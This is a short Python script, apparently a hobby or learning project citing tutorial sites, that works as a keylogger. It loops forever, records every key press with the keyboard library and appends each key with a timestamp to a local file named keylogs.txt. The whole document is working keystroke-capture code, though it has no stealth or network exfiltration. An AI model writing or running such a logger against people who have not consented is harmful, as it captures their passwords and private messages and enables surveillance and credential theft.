# sources: https://www.w3schools.com/python/python_file_write.asp, https://www.geeksforgeeks.org/python/how-to-detect-if-a-specific-key-pressed-using-python/, https://www.w3schools.com/python/python_datetime.asp, https://github.com/boppreh/keyboard

import keyboard
import datetime

while True:
    with open("keylogs.txt", "a") as logs_file:

        # store all key presses as events until the 'Enter' key is pressed
        events = keyboard.record(until='Enter')
        for event in events:
            if event.event_type == keyboard.KEY_DOWN:
                logs_file.write(f"[{datetime.datetime.now()}]: '{event.name}'\n")